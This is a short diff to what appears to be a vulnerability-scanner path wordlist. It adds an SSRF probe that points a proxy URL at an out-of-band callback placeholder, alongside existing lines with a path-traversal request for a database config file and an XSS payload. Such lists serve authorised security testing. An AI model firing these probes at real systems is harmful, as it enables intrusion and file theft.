@@ -99,3 +99,4 @@
 /index.php?rest_route=/whm/v3/themesettings
 /index/download/index?name=index.php&url=../../application/database.php
 /card_scan.php?No=0000&ReaderNo=0000&CardFormatNo=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E
+/proxy?url=http://{{interactsh-url}}
